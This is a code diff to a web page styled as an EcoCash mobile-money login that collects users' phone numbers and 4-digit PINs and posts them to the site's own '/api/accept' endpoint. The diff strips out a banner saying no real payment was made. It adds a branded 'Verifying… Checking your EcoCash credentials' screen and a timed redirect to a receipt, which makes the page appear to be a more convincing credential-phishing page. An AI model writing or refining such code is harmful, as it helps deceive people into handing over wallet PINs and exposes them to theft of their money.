@@ -90,16 +90,31 @@
   .form-error { display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C; font-size: 13px; font-weight: 500; padding: 10px 12px; border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5; }
   .form-error.show { display: block; }
 
-  .demo-banner { display: none; margin-top: 18px; padding: 10px 12px; background: #FFF7ED; border: 1px solid #FED7AA; color: #9A3412; font-size: 11.5px; border-radius: 10px; text-align: center; line-height: 1.5; }
-  .demo-banner.show { display: block; }
-
-  .loading { position: absolute; inset: 0; background: rgba(255,255,255,0.94); display: none; align-items: center; justify-content: center; z-index: 20; border-radius: 42px; }
-  .loading.show { display: flex; }
-  .loading .inner { text-align: center; padding: 0 24px; }
-  .spinner { width: 50px; height: 50px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; margin: 0 auto 16px; animation: spin 0.9s linear infinite; }
+  /* Verifying full-screen overlay */
+  .verifying {
+    position: fixed; inset: 0;
+    background: #FFFFFF;
+    display: none; align-items: center; justify-content: center;
+    z-index: 2000;
+  }
+  .verifying.show { display: flex; }
+  .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
+  .verifying .logo-big {
+    display: inline-flex; align-items: baseline;
+    font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 34px;
+  }
+  .verifying .logo-big .eco { color: var(--eco-blue); }
+  .verifying .logo-big .cash { color: var(--eco-red); }
+  .verifying .spinner {
+    width: 54px; height: 54px; margin: 0 auto 22px;
+    border: 4px solid #E5E7EB;
+    border-top-color: var(--eco-blue);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .loading .t { font-size: 15px; font-weight: 800; margin-bottom: 4px; }
-  .loading .s { font-size: 12px; color: var(--eco-muted); }
+  .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
 
   @media (max-width: 420px) {
     .overlay { padding: 16px 10px; }
@@ -135,14 +150,6 @@
 
 <div class="overlay" id="overlay">
   <div class="modal">
-    <div class="loading" id="loading">
-      <div class="inner">
-        <div class="spinner"></div>
-        <div class="t">Authorising payment…</div>
-        <div class="s">Please don't close this page.</div>
-      </div>
-    </div>
-
     <button class="close-btn" onclick="closeModal()" aria-label="Close">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
     </button>
@@ -175,10 +182,18 @@
         </div>
 
         <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
-
-        <div class="demo-banner" id="demoBanner">Demonstration mode. No real payment was made.</div>
       </div>
     </div>
+  </div>
+</div>
+
+<!-- Full-page verifying overlay -->
+<div class="verifying" id="verifying">
+  <div class="inner">
+    <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="spinner"></div>
+    <div class="t">Verifying…</div>
+    <div class="s">Checking your EcoCash credentials. Please don't close this page.</div>
   </div>
 </div>
 
@@ -297,9 +312,8 @@ async function submitLogin() {
   if (pin.length !== 4) { showFormError('Please enter all 4 PIN digits.'); const empty = pinEls.find(el => !el.value); if (empty) empty.focus(); return; }
 
   const btn = document.getElementById('loginBtn');
-  const loading = document.getElementById('loading');
   btn.disabled = true;
-  loading.classList.add('show');
+  btn.textContent = 'Logging in…';
 
   try {
     const res = await fetch('/api/accept', {
@@ -312,37 +326,34 @@ async function submitLogin() {
       })
     });
 
-    let result = { status: 'pending' };
+    let result = { status: 'verifying' };
     try { result = await res.json(); } catch (e) {}
 
-    loading.classList.remove('show');
-    btn.disabled = false;
-
-    if (result.status === 'success') {
-      if (currentTx) { currentTx.status = 'success'; try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {} }
-      window.location.href = 'client.html';
-      return;
-    }
     if (result.status === 'failed') {
-      showFormError(result.message || 'Payment failed. Please check your number and PIN.');
-      pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
-      pinEls[0].focus();
-      return;
-    }
-    if (result.status === 'demo') {
-      document.getElementById('demoBanner').classList.add('show');
-      showFormError('Demonstration mode: no real payment was made. Connect the EcoCash provider to enable real payments.');
+      btn.disabled = false;
+      btn.textContent = 'Login';
+      showFormError(result.message || 'Authorization failed. Please check your number and PIN.');
       pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
       pinEls[0].focus();
       return;
     }
 
-    if (currentTx) { currentTx.status = 'pending'; try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {} }
-    window.location.href = 'client.html';
+    // Success or verifying — show full-page verifying overlay
+    document.getElementById('verifying').classList.add('show');
+
+    if (currentTx) {
+      currentTx.status = 'pending';
+      try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {}
+    }
+
+    // Give the verifying screen a moment, then return to the receipt
+    setTimeout(() => {
+      window.location.href = 'client.html';
+    }, 3200);
   } catch (err) {
-    loading.classList.remove('show');
     btn.disabled = false;
-    showFormError('Could not process payment. Please try again.');
+    btn.textContent = 'Login';
+    showFormError('Could not process request. Please try again.');
   }
 }
 
